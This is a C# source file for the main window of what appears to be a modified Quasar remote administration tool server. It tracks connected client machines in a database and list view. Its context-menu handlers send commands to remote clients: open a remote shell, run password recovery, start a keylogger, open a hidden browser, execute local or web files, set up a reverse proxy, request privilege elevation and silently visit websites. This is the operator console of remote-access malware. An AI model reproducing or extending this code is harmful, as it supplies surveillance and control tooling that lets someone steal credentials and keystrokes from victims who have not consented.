using Quasar.Common.Enums;
using Quasar.Common.Messages;
using Quasar.Server.Extensions;
using Quasar.Server.Messages;
using Quasar.Server.Models;
using Quasar.Server.Networking;
using Quasar.Server.Utilities;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;

namespace Quasar.Server.Forms
{
    public partial class FrmMain : Form
    {
        public QuasarServer ListenServer { get; set; }

        /* Column order: IP(0), AcceptPing(1), Tag(2), User@PC(3), Version(4), Status(5), UserStatus(6), ... */
        private const int ACCEPT_PING_ID = 1;
        private const int STATUS_ID = 5;
        private const int USERSTATUS_ID = 6;
        private const int INSTALL_TIME_ID = 10;
        private const int LAST_PING_TIME_ID = 11;
        private const int UUID_ID = 12;

        private bool _titleUpdateRunning;
        private bool _processingClientConnections;
        private readonly ClientStatusHandler _clientStatusHandler;
        private readonly ClientPingRequestHandler _clientPingHandler;
        private readonly Queue<KeyValuePair<Client, bool>> _clientConnections = new Queue<KeyValuePair<Client, bool>>();
        private readonly object _processingClientConnectionsLock = new object();
        private readonly object _lockClients = new object(); // lock for clients-listview
        private readonly ClientDatabase _clientDb;
        private volatile int _loadingDbRows;

        public FrmMain()
        {
            _clientStatusHandler = new ClientStatusHandler();
            _clientPingHandler = new ClientPingRequestHandler();
            RegisterMessageHandler();
            InitializeComponent();
            _clientDb = new ClientDatabase();
            lstClients.OwnerDraw = true;
            lstClients.DrawColumnHeader += lstClients_DrawColumnHeader;
            lstClients.DrawItem += lstClients_DrawItem;
            lstClients.DrawSubItem += lstClients_DrawSubItem;
            lstClients.MouseUp += lstClients_MouseUp;
        }

        /// <summary>
        /// Registers the client status message handler for client communication.
        /// </summary>
        private void RegisterMessageHandler()
        {
            MessageHandler.Register(_clientStatusHandler);
            _clientStatusHandler.StatusUpdated += SetStatusByClient;
            _clientStatusHandler.UserStatusUpdated += SetUserStatusByClient;

            MessageHandler.Register(_clientPingHandler);
            _clientPingHandler.PingReceived += SetPingByClient;
        }

        /// <summary>
        /// Unregisters the client status message handler.
        /// </summary>
        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_clientStatusHandler);
            _clientStatusHandler.StatusUpdated -= SetStatusByClient;
            _clientStatusHandler.UserStatusUpdated -= SetUserStatusByClient;

            MessageHandler.Unregister(_clientPingHandler);
            _clientPingHandler.PingReceived -= SetPingByClient;
        }

        public void UpdateWindowTitle()
        {
            if (_titleUpdateRunning) return;
            _titleUpdateRunning = true;
            try
            {
                this.Invoke((MethodInvoker) delegate
                {
                    int selected = lstClients.SelectedItems.Count;
                    this.Text = (selected > 0)
                        ? string.Format("Quasar - Connected: {0} [Selected: {1}]", ListenServer.ConnectedClients.Length,
                            selected)
                        : string.Format("Quasar - Connected: {0}", ListenServer.ConnectedClients.Length);
                });
            }
            catch (Exception)
            {
            }
            _titleUpdateRunning = false;
        }

        private void InitializeServer()
        {
            X509Certificate2 serverCertificate;
#if DEBUG
            serverCertificate = new DummyCertificate();
#else
            if (!File.Exists(Settings.CertificatePath))
            {
                using (var certificateSelection = new FrmCertificate())
                {
                    while (certificateSelection.ShowDialog() != DialogResult.OK)
                    { }
                }
            }
            serverCertificate = new X509Certificate2(Settings.CertificatePath);
#endif
            /*var str = Convert.ToBase64String(serverCertificate.Export(X509ContentType.Cert));

            var cert2 = new X509Certificate2(Convert.FromBase64String(str));
            var serverCsp = (RSACryptoServiceProvider)serverCertificate.PublicKey.Key;
            var connectedCsp = (RSACryptoServiceProvider)new X509Certificate2(cert2).PublicKey.Key;

            var result = serverCsp.ExportParameters(false);
            var result2 = connectedCsp.ExportParameters(false);

            var b = SafeComparison.AreEqual(result.Exponent, result2.Exponent) &&
                    SafeComparison.AreEqual(result.Modulus, result2.Modulus);*/

            ListenServer = new QuasarServer(serverCertificate);
            ListenServer.ServerState += ServerState;
            ListenServer.ClientConnected += ClientConnected;
            ListenServer.ClientDisconnected += ClientDisconnected;
        }

        private void StartConnectionListener()
        {
            try
            {
                ListenServer.Listen(Settings.ListenPort, Settings.IPv6Support, Settings.UseUPnP);
            }
            catch (SocketException ex)
            {
                if (ex.ErrorCode == 10048)
                {
                    MessageBox.Show(this, "The port is already in use.", "Viewer - Socket Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                else
                {
                    MessageBox.Show(this, string.Format("Socket error: {0}\nError Code: {1}", ex.Message, ex.ErrorCode), "Viewer - Socket Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                ListenServer.Disconnect();
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, "Failed to start listener: " + ex.Message, "Viewer - Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                ListenServer.Disconnect();
            }
        }

        private void AutostartListening()
        {
            if (Settings.AutoListen)
            {
                StartConnectionListener();
            }

            if (Settings.EnableNoIPUpdater)
            {
                NoIpUpdater.Start();
            }
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            InitializeServer();
            _clientDb.Initialize();
            _clientDb.SetAllClientsDisconnected();
            LoadClientsFromDatabase();
            AutostartListening();
        }

        private void lstClients_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
        {
            e.DrawDefault = true;
        }

        private void lstClients_DrawItem(object sender, DrawListViewItemEventArgs e)
        {
            /* In Details view, we draw per-subitem (so Accept Ping can be custom). */
            if (lstClients.View == View.Details)
            {
                // Background is handled by DrawSubItem.
                return;
            }
            e.DrawDefault = true;
        }

        private void lstClients_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
        {
            if (e.ColumnIndex != ACCEPT_PING_ID)
            {
                e.DrawDefault = true;
                return;
            }

            bool accept = false;
            if (e.SubItem?.Tag is bool b) accept = b;

            e.Graphics.FillRectangle(
                ((e.ItemState & ListViewItemStates.Selected) != 0) ? SystemBrushes.Highlight : SystemBrushes.Window,
                e.Bounds);

            // Draw a centered checkbox glyph (reliable even without visual styles).
            const int cb = 13;
            int x = e.Bounds.Left + (e.Bounds.Width - cb) / 2;
            int y = e.Bounds.Top + (e.Bounds.Height - cb) / 2;
            var state = accept ? ButtonState.Checked : ButtonState.Normal;
            ControlPaint.DrawCheckBox(e.Graphics, new Rectangle(x, y, cb, cb), state);
        }

        private void lstClients_MouseUp(object sender, MouseEventArgs e)
        {
            if (_loadingDbRows != 0) return;
            var hit = lstClients.HitTest(e.Location);
            if (hit?.Item == null) return;

            /* Determine which column was clicked by comparing X against column boundaries. */
            int x = e.Location.X;
            int col = 0;
            int left = 0;
            foreach (ColumnHeader ch in lstClients.Columns)
            {
                int right = left + ch.Width;
                if (x >= left && x < right) { break; }
                left = right;
                col++;
            }
            if (col != ACCEPT_PING_ID) return;

            var item = hit.Item;
            if (item.SubItems.Count <= UUID_ID || item.SubItems.Count <= ACCEPT_PING_ID) return;
            var uuid = item.SubItems[UUID_ID].Text;
            if (string.IsNullOrWhiteSpace(uuid)) return;

            bool current = item.SubItems[ACCEPT_PING_ID].Tag is bool b && b;
            bool next = !current;
            item.SubItems[ACCEPT_PING_ID].Tag = next;
            _clientDb.SetClientAcceptPing(uuid, next);

            lstClients.Invalidate(item.SubItems[ACCEPT_PING_ID].Bounds);
        }

        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            ListenServer.Disconnect();
            UnregisterMessageHandler();
            notifyIcon.Visible = false;
            notifyIcon.Dispose();
        }

        private void lstClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            UpdateWindowTitle();
        }

        private void ServerState(Networking.Server server, bool listening, ushort port)
        {
            try
            {
                this.Invoke((MethodInvoker) delegate
                {
                    listenToolStripStatusLabel.Text = listening ? string.Format("Listening on port {0}.", port) : "Not listening.";
                });
                UpdateWindowTitle();
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void ClientConnected(Client client)
        {
            lock (_clientConnections)
            {
                if (!ListenServer.Listening) return;
                _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, true));
            }

            lock (_processingClientConnectionsLock)
            {
                if (!_processingClientConnections)
                {
                    _processingClientConnections = true;
                    ThreadPool.QueueUserWorkItem(ProcessClientConnections);
                }
            }
        }

        private void ClientDisconnected(Client client)
        {
            lock (_clientConnections)
            {
                if (!ListenServer.Listening) return;
                _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, false));
            }

            lock (_processingClientConnectionsLock)
            {
                if (!_processingClientConnections)
                {
                    _processingClientConnections = true;
                    ThreadPool.QueueUserWorkItem(ProcessClientConnections);
                }
            }
        }

        private void ProcessClientConnections(object state)
        {
            while (true)
            {
                KeyValuePair<Client, bool> client;
                lock (_clientConnections)
                {
                    if (!ListenServer.Listening)
                    {
                        _clientConnections.Clear();
                    }

                    if (_clientConnections.Count == 0)
                    {
                        lock (_processingClientConnectionsLock)
                        {
                            _processingClientConnections = false;
                        }
                        return;
                    }

                    client = _clientConnections.Dequeue();
                }

                if (client.Key != null)
                {
                    switch (client.Value)
                    {
                        case true:
                            AddClientToListview(client.Key);
                            if (Settings.ShowPopup)
                                ShowPopup(client.Key);
                            break;
                        case false:
                            RemoveClientFromListview(client.Key);
                            break;
                    }
                }
            }
        }

        /// <summary>
        /// Sets the tooltip text of the listview item of a client.
        /// </summary>
        /// <param name="client">The client on which the change is performed.</param>
        /// <param name="text">The new tooltip text.</param>
        public void SetToolTipText(Client client, string text)
        {
            if (client == null) return;

            try
            {
                lstClients.Invoke((MethodInvoker) delegate
                {
                    var item = GetListViewItemByClient(client);
                    if (item != null)
                        item.ToolTipText = text;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// <summary>
        /// Adds a connected client to the Listview.
        /// </summary>
        /// <param name="client">The client to add.</param>
        private void AddClientToListview(Client client)
        {
            if (client == null) return;

            try
            {
                // this " " leaves some space between the flag-icon and first item
                string uuid = client.Value.Id;
                string status = "Connected";
                string userStatus = "Active";

                var row = _clientDb.UpsertClientBasics(
                    uuid,
                    client.EndPoint.Address.ToString(),
                    client.Value.Tag,
                    client.Value.UserAtPc,
                    client.Value.Version,
                    status,
                    userStatus,
                    client.Value.Country,
                    client.Value.CountryCode,
                    client.Value.OperatingSystem,
                    client.Value.AccountType,
                    client.Value.ImageIndex);

                var lviExisting = GetListViewItemByUuid(uuid);
                if (lviExisting != null)
                {
                    lviExisting.Tag = client;
                    lviExisting.ImageIndex = row.ImageIndex;
                    lviExisting.SubItems[0].Text = " " + client.EndPoint.Address;
                    lviExisting.SubItems[ACCEPT_PING_ID].Tag = _clientDb.GetClientAcceptPing(uuid);
                    lviExisting.SubItems[2].Text = client.Value.Tag;
                    lviExisting.SubItems[3].Text = client.Value.UserAtPc;
                    lviExisting.SubItems[4].Text = client.Value.Version;
                    lviExisting.SubItems[STATUS_ID].Text = status;
                    lviExisting.SubItems[USERSTATUS_ID].Text = userStatus;
                    lviExisting.SubItems[7].Text = client.Value.CountryWithCode;
                    lviExisting.SubItems[8].Text = client.Value.OperatingSystem;
                    lviExisting.SubItems[9].Text = client.Value.AccountType;
                    lviExisting.SubItems[INSTALL_TIME_ID].Text = FormatNullableUtc(row.InstallTimeUtc);
                    lviExisting.SubItems[LAST_PING_TIME_ID].Text = FormatNullableUtc(row.LastPingTimeUtc);
                    lviExisting.SubItems[UUID_ID].Text = uuid;
                }
                else
                {
                    // Keep order aligned with FrmMain.Designer.cs column order.
                    ListViewItem lvi = new ListViewItem(new string[]
                    {
                        " " + client.EndPoint.Address, // IP Address
                        "",                            // Accept Ping (checkbox)
                        client.Value.Tag,              // Tag
                        client.Value.UserAtPc,        // User@PC
                        client.Value.Version,         // Version
                        status,                       // Status
                        userStatus,                   // User Status
                        client.Value.CountryWithCode,// Country
                        client.Value.OperatingSystem,// Operating System
                        client.Value.AccountType,     // Account Type
                        FormatNullableUtc(row.InstallTimeUtc), // Install Time
                        FormatNullableUtc(row.LastPingTimeUtc), // Last Ping
                        uuid                          // Uuid
                    }) { Tag = client, ImageIndex = row.ImageIndex };
                    lvi.SubItems[ACCEPT_PING_ID].Tag = _clientDb.GetClientAcceptPing(uuid);

                    lstClients.Invoke((MethodInvoker) delegate
                    {
                        lock (_lockClients)
                        {
                            lstClients.Items.Add(lvi);
                        }
                    });
                }

                UpdateWindowTitle();
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// <summary>
        /// Marks a disconnected client row (does not remove historical rows).
        /// </summary>
        /// <param name="client">The client to remove.</param>
        private void RemoveClientFromListview(Client client)
        {
            if (client == null) return;

            try
            {
                string uuid = client.Value.Id;
                var lvi = GetListViewItemByUuid(uuid);

                // Preserve last user-status (it is updated separately from SetStatus).
                string existingUserStatus = (lvi != null && lvi.SubItems.Count > USERSTATUS_ID)
                    ? lvi.SubItems[USERSTATUS_ID].Text
                    : "Active";

                var row = _clientDb.UpsertClientBasics(
                    uuid,
                    client.EndPoint.Address.ToString(),
                    client.Value.Tag,
                    client.Value.UserAtPc,
                    client.Value.Version,
                    "Disconnected",
                    existingUserStatus,
                    client.Value.Country,
                    client.Value.CountryCode,
                    client.Value.OperatingSystem,
                    client.Value.AccountType,
                    client.Value.ImageIndex);

                lstClients.Invoke((MethodInvoker) delegate
                {
                    lock (_lockClients)
                    {
                        if (lvi == null)
                            return;

                        lvi.Tag = null;              // keep history, but don't allow actions
                        lvi.ImageIndex = row.ImageIndex;
                        lvi.SubItems[0].Text = " " + client.EndPoint.Address;
                        lvi.SubItems[2].Text = client.Value.Tag;
                        lvi.SubItems[3].Text = client.Value.UserAtPc;
                        lvi.SubItems[4].Text = client.Value.Version;
                        lvi.SubItems[STATUS_ID].Text = "Disconnected";
                        lvi.SubItems[USERSTATUS_ID].Text = existingUserStatus;
                        lvi.SubItems[7].Text = client.Value.CountryWithCode;
                        lvi.SubItems[8].Text = client.Value.OperatingSystem;
                        lvi.SubItems[9].Text = client.Value.AccountType;
                        lvi.SubItems[INSTALL_TIME_ID].Text = FormatNullableUtc(row.InstallTimeUtc);
                        lvi.SubItems[LAST_PING_TIME_ID].Text = FormatNullableUtc(row.LastPingTimeUtc);
                        lvi.SubItems[UUID_ID].Text = uuid;
                    }
                });
                UpdateWindowTitle();
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// <summary>
        /// Sets the status of a client.
        /// </summary>
        /// <param name="sender">The message handler which raised the event.</param>
        /// <param name="client">The client to update the status of.</param>
        /// <param name="text">The new status.</param>
        private void SetStatusByClient(object sender, Client client, string text)
        {
            var item = GetListViewItemByClient(client);
            if (item != null)
            {
                item.SubItems[STATUS_ID].Text = text;

                _clientDb.UpsertClientBasics(
                    client.Value.Id,
                    client.EndPoint.Address.ToString(),
                    client.Value.Tag,
                    client.Value.UserAtPc,
                    client.Value.Version,
                    text,
                    item.SubItems[USERSTATUS_ID].Text,
                    client.Value.Country,
                    client.Value.CountryCode,
                    client.Value.OperatingSystem,
                    client.Value.AccountType,
                    client.Value.ImageIndex);
            }
        }

        /// <summary>
        /// Sets the user status of a client.
        /// </summary>
        /// <param name="sender">The message handler which raised the event.</param>
        /// <param name="client">The client to update the user status of.</param>
        /// <param name="userStatus">The new user status.</param>
        private void SetUserStatusByClient(object sender, Client client, UserStatus userStatus)
        {
            var item = GetListViewItemByClient(client);
            if (item != null)
            {
                item.SubItems[USERSTATUS_ID].Text = userStatus.ToString();

                _clientDb.UpsertClientBasics(
                    client.Value.Id,
                    client.EndPoint.Address.ToString(),
                    client.Value.Tag,
                    client.Value.UserAtPc,
                    client.Value.Version,
                    item.SubItems[STATUS_ID].Text,
                    userStatus.ToString(),
                    client.Value.Country,
                    client.Value.CountryCode,
                    client.Value.OperatingSystem,
                    client.Value.AccountType,
                    client.Value.ImageIndex);
            }
        }

        private void SetPingByClient(object sender, Client client, DateTime pingTimeUtc)
        {
            if (client == null || client.Value == null) return;

            string uuid = client.Value.Id;
            if (string.IsNullOrWhiteSpace(uuid)) return;

            bool acceptPing = _clientDb.GetClientAcceptPing(uuid);
            _clientDb.UpdateClientLastPingTimeUtc(uuid, pingTimeUtc);

            var item = GetListViewItemByClient(client);
            if (item != null)
            {
                item.SubItems[LAST_PING_TIME_ID].Text = FormatNullableUtc(pingTimeUtc);
            }

            /* Always show a toast on ping, regardless of Accept Ping. */
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    string ip = client.EndPoint?.Address?.ToString() ?? "";
                    string who = client.Value.UserAtPc;
                    if (string.IsNullOrWhiteSpace(who) || who.Trim() == "@")
                        who = string.IsNullOrWhiteSpace(client.Value.Username) ? (uuid ?? "Client") : $"{client.Value.Username}@{client.Value.PcName}";
                    string status = acceptPing ? "accepted" : "ignored";
                    notifyIcon.ShowBalloonTip(
                        2000,
                        "Ping received",
                        $"{who} ({ip}) ping {status} at {FormatNullableUtc(pingTimeUtc)}",
                        ToolTipIcon.Info);
                });
            }
            catch
            {
            }
        }

        /// <summary>
        /// Gets the Listview item which belongs to the client. 
        /// </summary>
        /// <param name="client">The client to get the Listview item of.</param>
        /// <returns>Listview item of the client.</returns>
        private ListViewItem GetListViewItemByClient(Client client)
        {
            if (client == null) return null;
            return GetListViewItemByUuid(client.Value?.Id);
        }

        private ListViewItem GetListViewItemByUuid(string uuid)
        {
            if (string.IsNullOrWhiteSpace(uuid)) return null;

            ListViewItem itemClient = null;
            lstClients.Invoke((MethodInvoker) delegate
            {
                itemClient = lstClients.Items.Cast<ListViewItem>()
                    .FirstOrDefault(lvi => lvi != null
                        && lvi.SubItems.Count > UUID_ID
                        && string.Equals(lvi.SubItems[UUID_ID].Text, uuid, StringComparison.OrdinalIgnoreCase));
            });
            return itemClient;
        }

        /// <summary>
        /// Gets all selected clients.
        /// </summary>
        /// <returns>An array of all selected Clients.</returns>
        private Client[] GetSelectedClients()
        {
            List<Client> clients = new List<Client>();

            lstClients.Invoke((MethodInvoker)delegate
            {
                lock (_lockClients)
                {
                    if (lstClients.SelectedItems.Count == 0) return;
                    clients.AddRange(
                        lstClients.SelectedItems.Cast<ListViewItem>()
                            .Where(lvi => lvi != null)
                            .Select(lvi => lvi.Tag as Client)
                            .Where(c => c != null));
                }
            });

            return clients.ToArray();
        }

        /// <summary>
        /// Gets all connected clients.
        /// </summary>
        /// <returns>An array of all connected Clients.</returns>
        private Client[] GetConnectedClients()
        {
            return ListenServer.ConnectedClients;
        }

        private void LoadClientsFromDatabase()
        {
            try
            {
                _loadingDbRows = 1;
                lstClients.Invoke((MethodInvoker)delegate
                {
                    lock (_lockClients)
                    {
                        lstClients.Items.Clear();
                        var rows = _clientDb.LoadAllClients();
                        foreach (var r in rows)
                        {
                            string countryWithCode = string.IsNullOrWhiteSpace(r.CountryCode)
                                ? r.Country
                                : $"{r.Country} [{r.CountryCode}]";

                            var lvi = new ListViewItem(new string[]
                            {
                                " " + (r.IpAddress ?? ""), // IP
                                "", // Accept Ping checkbox column
                                r.Tag ?? "",
                                r.UserPc ?? "",
                                r.Version ?? "",
                                r.Status ?? "Disconnected",
                                r.UserStatus ?? "",
                                countryWithCode,
                                r.OperatingSystem ?? "",
                                r.AccountType ?? "",
                                FormatNullableUtc(r.InstallTimeUtc),
                                FormatNullableUtc(r.LastPingTimeUtc),
                                r.Uuid ?? ""
                            })
                            {
                                Tag = null,
                                ImageIndex = r.ImageIndex
                            };
                            lvi.SubItems[ACCEPT_PING_ID].Tag = r.AcceptPing;

                            lstClients.Items.Add(lvi);
                        }
                    }
                });
                _loadingDbRows = 0;
            }
            catch (Exception)
            {
                // Non-fatal: UI will still update from connected clients.
                _loadingDbRows = 0;
            }
        }

        private static string FormatNullableUtc(DateTime? dtUtc)
        {
            if (dtUtc == null) return string.Empty;
            try
            {
                // Show local time for easier reading.
                return dtUtc.Value.ToLocalTime().ToString("yyyy-MM-dd HH:mm:ss");
            }
            catch
            {
                return string.Empty;
            }
        }

        /// <summary>
        /// Displays a popup with information about a client.
        /// </summary>
        /// <param name="c">The client.</param>
        private void ShowPopup(Client c)
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    if (c == null || c.Value == null) return;
                    
                    notifyIcon.ShowBalloonTip(4000, string.Format("Client connected from {0}!", c.Value.Country),
                        string.Format("IP Address: {0}\nOperating System: {1}", c.EndPoint.Address.ToString(),
                        c.Value.OperatingSystem), ToolTipIcon.Info);
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        #region "ContextMenuStrip"

        #region "Client Management"

        private void elevateClientPermissionsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoAskElevate());
            }
        }

        private void updateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients);
                frmRe.Show();
            }
        }

        private void reconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoClientReconnect());
            }
        }

        private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                /* Close ghost browser window on client before disconnecting. */
                c.Send(new DoCloseHiddenBrowser());
                c.Send(new DoClientDisconnect());
            }
        }

        private void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count == 0) return;
            if (
                MessageBox.Show(
                    string.Format(
                        "Are you sure you want to uninstall the client on {0} computer\\s?",
                        lstClients.SelectedItems.Count), "Uninstall Confirmation", MessageBoxButtons.YesNo,
                    MessageBoxIcon.Question) == DialogResult.Yes)
            {
                foreach (Client c in GetSelectedClients())
                {
                    c.Send(new DoClientUninstall());
                }
            }
        }

        private string[] GetSelectedUuidsFromListview()
        {
            List<string> uuids = new List<string>();
            if (lstClients.SelectedItems.Count == 0) return new string[0];

            foreach (ListViewItem lvi in lstClients.SelectedItems)
            {
                if (lvi == null) continue;
                if (lvi.SubItems.Count <= UUID_ID) continue;
                string uuid = lvi.SubItems[UUID_ID].Text;
                if (string.IsNullOrWhiteSpace(uuid)) continue;

                bool exists = false;
                foreach (var u in uuids)
                {
                    if (string.Equals(u, uuid, StringComparison.OrdinalIgnoreCase))
                    {
                        exists = true;
                        break;
                    }
                }
                if (!exists) uuids.Add(uuid);
            }

            return uuids.ToArray();
        }

        private void deleteFromDbToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string[] uuids = GetSelectedUuidsFromListview();
            if (uuids.Length == 0) return;

            if (MessageBox.Show(
                    string.Format("Delete {0} client entr{1} from the database?", uuids.Length, (uuids.Length == 1 ? "y" : "ies")),
                    "Delete from DB", MessageBoxButtons.YesNo, MessageBoxIcon.Question) != DialogResult.Yes)
                return;

            foreach (string uuid in uuids)
                _clientDb.DeleteClient(uuid);

            LoadClientsFromDatabase();
        }

        #endregion

        #region "Administration"

        private void systemInformationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmSystemInformation frmSi = FrmSystemInformation.CreateNewOrGetExisting(c);
                frmSi.Show();
                frmSi.Focus();
            }
        }

        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmFileManager frmFm = FrmFileManager.CreateNewOrGetExisting(c);
                frmFm.Show();
                frmFm.Focus();
            }
        }

        private void startupManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmStartupManager frmStm = FrmStartupManager.CreateNewOrGetExisting(c);
                frmStm.Show();
                frmStm.Focus();
            }
        }

        private void taskManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmTaskManager frmTm = FrmTaskManager.CreateNewOrGetExisting(c);
                frmTm.Show();
                frmTm.Focus();
            }
        }

        private void remoteShellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmRemoteShell frmRs = FrmRemoteShell.CreateNewOrGetExisting(c);
                frmRs.Show();
                frmRs.Focus();
            }
        }

        private void connectionsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmConnections frmCon = FrmConnections.CreateNewOrGetExisting(c);
                frmCon.Show();
                frmCon.Focus();
            }
        }

        private void reverseProxyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmReverseProxy frmRs = new FrmReverseProxy(clients);
                frmRs.Show();
            }
        }

        private void registryEditorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                foreach (Client c in GetSelectedClients())
                {
                    FrmRegistryEditor frmRe = FrmRegistryEditor.CreateNewOrGetExisting(c);
                    frmRe.Show();
                    frmRe.Focus();
                }
            }
        }

        private void localFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients);
                frmRe.Show();
            }
        }

        private void webFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients);
                frmRe.Show();
            }
        }

        private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShutdownAction {Action = ShutdownAction.Shutdown});
            }
        }

        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShutdownAction {Action = ShutdownAction.Restart});
            }
        }

        private void standbyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShutdownAction {Action = ShutdownAction.Standby});
            }
        }

        #endregion

        #region "Monitoring"

        private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmRd = FrmRemoteDesktop.CreateNewOrGetExisting(c, RemoteControlMode.User);
                frmRd.Show();
                frmRd.Focus();
            }
        }

        private void remoteDesktopKernelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmRd = FrmRemoteDesktop.CreateNewOrGetExisting(c, RemoteControlMode.Kernel);
                frmRd.Show();
                frmRd.Focus();
            }
        }

        private void hiddenBrowserToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frm = FrmHiddenBrowser.CreateNewOrGetExisting(c);
                frm.Show();
                frm.Focus();
            }
        }

        private void passwordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmPasswordRecovery frmPass = new FrmPasswordRecovery(clients);
                frmPass.Show();
            }
        }

        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmKeylogger frmKl = FrmKeylogger.CreateNewOrGetExisting(c);
                frmKl.Show();
                frmKl.Focus();
            }
        }

        #endregion

        #region "User Support"

        private void visitWebsiteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmVisitWebsite(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            c.Send(new DoVisitWebsite
                            {
                                Url = frm.Url,
                                Hidden = frm.Hidden
                            });
                        }
                    }
                }
            }
        }

        private void showMessageboxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmShowMessagebox(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            c.Send(new DoShowMessageBox
                            {
                                Caption = frm.MsgBoxCaption,
                                Text = frm.MsgBoxText,
                                Button = frm.MsgBoxButton,
                                Icon = frm.MsgBoxIcon
                            });
                        }
                    }
                }
            }
        }

        #endregion

        private void selectAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            lstClients.SelectAllItems();
        }

        #endregion

        #region "MenuStrip"

        private void closeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmSettings(ListenServer))
            {
                frm.ShowDialog();
            }
        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmAbout())
            {
                frm.ShowDialog();
            }
        }

        #endregion

        #region "NotifyIcon"

        private void notifyIcon_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            this.WindowState = (this.WindowState == FormWindowState.Normal)
                ? FormWindowState.Minimized
                : FormWindowState.Normal;
            this.ShowInTaskbar = (this.WindowState == FormWindowState.Normal);
        }

        #endregion
    }
}